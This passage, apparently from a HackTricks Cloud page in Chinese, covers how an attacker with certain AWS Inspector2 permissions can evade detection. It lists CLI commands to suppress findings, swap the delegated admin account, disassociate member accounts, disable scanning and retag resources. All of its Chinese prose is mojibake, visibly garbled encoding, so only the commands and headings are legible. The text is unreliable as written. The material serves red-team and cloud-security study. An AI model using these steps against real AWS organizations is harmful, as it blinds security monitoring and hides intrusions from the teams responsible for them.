aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
- **æ½œåœ¨å½±å“**ï¼šéšè—æˆ–æŠ‘åˆ¶å…³é”®æ¼æ´ï¼Œæˆ–å‘ç³»ç»Ÿæ³¨å…¥å¤§é‡æ— å…³å‘ç°ã€‚

### `inspector2:DisableDelegatedAdminAccount`ï¼Œ(`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

æ”»å‡»è€…å¯èƒ½ä¼šä¸¥é‡ç ´åå®‰å…¨ç®¡ç†ç»“æ„ã€‚

- ç¦ç”¨å§”æ´¾ç®¡ç†å‘˜å¸æˆ·ï¼Œæ”»å‡»è€…å¯ä»¥é˜»æ­¢å®‰å…¨å›¢é˜Ÿè®¿é—®å’Œç®¡ç†Amazon Inspectorçš„è®¾ç½®å’ŒæŠ¥å‘Šã€‚
- å¯ç”¨æœªç»æˆæƒçš„ç®¡ç†å‘˜å¸æˆ·å°†å…è®¸æ”»å‡»è€…æ§åˆ¶å®‰å…¨é…ç½®ï¼Œå¯èƒ½ç¦ç”¨æ‰«ææˆ–ä¿®æ”¹è®¾ç½®ä»¥éšè—æ¶æ„æ´»åŠ¨ã€‚

{% hint style="warning" %}

æœªç»æˆæƒçš„å¸æˆ·éœ€è¦ä¸å—å®³è€…åœ¨åŒä¸€ç»„ç»‡ä¸­ï¼Œæ‰èƒ½æˆä¸ºå§”æ´¾ç®¡ç†å‘˜ã€‚

ä¸ºä½¿æœªç»æˆæƒçš„å¸æˆ·æˆä¸ºå§”æ´¾ç®¡ç†å‘˜ï¼Œè¿˜éœ€è¦åœ¨åˆæ³•çš„å§”æ´¾ç®¡ç†å‘˜è¢«ç¦ç”¨åï¼Œå¹¶åœ¨æœªç»æˆæƒçš„å¸æˆ·è¢«å¯ç”¨ä¸ºå§”æ´¾ç®¡ç†å‘˜ä¹‹å‰ï¼Œå°†åˆæ³•ç®¡ç†å‘˜ä»ç»„ç»‡ä¸­å–æ¶ˆæ³¨å†Œä¸ºå§”æ´¾ç®¡ç†å‘˜ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®Œæˆæ­¤æ“ä½œï¼ˆéœ€è¦**`organizations:DeregisterDelegatedAdministrator`**æƒé™ï¼‰ï¼š**`aws organizations deregister-delegated-administrator --account-id <åˆæ³•å¸æˆ·ID> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**

{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
- **æ½œåœ¨å½±å“**ï¼šç ´åå®‰å…¨ç®¡ç†ã€‚

### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

æ”»å‡»è€…å¯ä»¥æ“çºµAmazon Inspectorç»„ç»‡ä¸­æˆå‘˜å¸æˆ·çš„å…³è”ã€‚é€šè¿‡å…³è”æœªç»æˆæƒçš„å¸æˆ·æˆ–å–æ¶ˆå…³è”åˆæ³•å¸æˆ·ï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶å“ªäº›å¸æˆ·åŒ…å«åœ¨å®‰å…¨æ‰«æå’ŒæŠ¥å‘Šä¸­ã€‚è¿™å¯èƒ½å¯¼è‡´å…³é”®å¸æˆ·è¢«æ’é™¤åœ¨å®‰å…¨ç›‘æ§ä¹‹å¤–ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿåœ¨è¿™äº›å¸æˆ·ä¸­åˆ©ç”¨æ¼æ´è€Œä¸è¢«å‘ç°ã€‚

{% hint style="warning" %}

æ­¤æ“ä½œéœ€è¦ç”±å§”æ´¾ç®¡ç†å‘˜æ‰§è¡Œã€‚

{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
- **æ½œåœ¨å½±å“**ï¼šä»å®‰å…¨æ‰«æä¸­æ’é™¤å…³é”®è´¦æˆ·ï¼Œä½¿æ¼æ´èƒ½å¤Ÿè¢«æœªæ£€æµ‹åˆ°åœ°åˆ©ç”¨ã€‚

### `inspector2:Disable`ï¼Œ(`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

æ‹¥æœ‰`inspector2:Disable`æƒé™çš„æ”»å‡»è€…å¯ä»¥åœ¨ç‰¹å®šèµ„æºç±»å‹ï¼ˆEC2ã€ECRã€Lambdaã€Lambdaä»£ç ï¼‰ä¸Šç¦ç”¨å®‰å…¨æ‰«æï¼Œä½¿AWSç¯å¢ƒçš„éƒ¨åˆ†åŒºåŸŸå¤„äºæœªç›‘æ§çŠ¶æ€ï¼Œå®¹æ˜“å—åˆ°æ”»å‡»ã€‚æ­¤å¤–ï¼Œå¦‚æœå…·æœ‰**`inspector2:Enable`**å’Œ**`iam:CreateServiceLinkedRole`**æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥é€‰æ‹©æ€§åœ°é‡æ–°å¯ç”¨æ‰«æï¼Œä»¥é¿å…æ£€æµ‹åˆ°å¯ç–‘é…ç½®ã€‚

{% hint style="warning" %}
æ­¤æ“ä½œéœ€è¦ç”±å§”æ´¾ç®¡ç†å‘˜æ‰§è¡Œã€‚
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
- **æ½œåœ¨å½±å“**ï¼šåœ¨å®‰å…¨ç›‘æ§ä¸­åˆ›å»ºç›²ç‚¹ã€‚

### `inspector2:UpdateOrganizationConfiguration`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥æ›´æ–°æ‚¨çš„Amazon Inspectorç»„ç»‡çš„é…ç½®ï¼Œå½±å“ä¸ºæ–°æˆå‘˜å¸æˆ·å¯ç”¨çš„é»˜è®¤æ‰«æåŠŸèƒ½ã€‚

{% hint style="warning" %}

æ­¤æ“ä½œéœ€è¦ç”±å§”æ´¾ç®¡ç†å‘˜æ‰§è¡Œã€‚

{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
- **æ½œåœ¨å½±å“**ï¼šæ›´æ”¹ç»„ç»‡çš„å®‰å…¨æ‰«æç­–ç•¥å’Œé…ç½®ã€‚

### `inspector2:TagResource`, `inspector2:UntagResource`

æ”»å‡»è€…å¯ä»¥æ“çºµ AWS Inspector èµ„æºä¸Šçš„æ ‡ç­¾ï¼Œè¿™äº›æ ‡ç­¾å¯¹äºç»„ç»‡ã€è·Ÿè¸ªå’Œè‡ªåŠ¨åŒ–å®‰å…¨è¯„ä¼°è‡³å…³é‡è¦ã€‚é€šè¿‡æ›´æ”¹æˆ–ç§»é™¤æ ‡ç­¾ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šéšè—å®‰å…¨æ‰«æä¸­çš„æ¼æ´ï¼Œå¹²æ‰°åˆè§„æ€§æŠ¥å‘Šï¼Œå¹¶å¹²æ‰°è‡ªåŠ¨åŒ–çš„ä¿®å¤æµç¨‹ï¼Œå¯¼è‡´æœªç»æ£€æŸ¥çš„å®‰å…¨é—®é¢˜å’Œç³»ç»Ÿå®Œæ•´æ€§å—æŸã€‚
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
- **æ½œåœ¨å½±å“**ï¼šéšè—æ¼æ´ï¼Œå¹²æ‰°åˆè§„æ€§æŠ¥å‘Šï¼Œå¹²æ‰°å®‰å…¨è‡ªåŠ¨åŒ–å’Œå¹²æ‰°æˆæœ¬åˆ†é…ã€‚

# å‚è€ƒ
- [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
- [https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)


{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
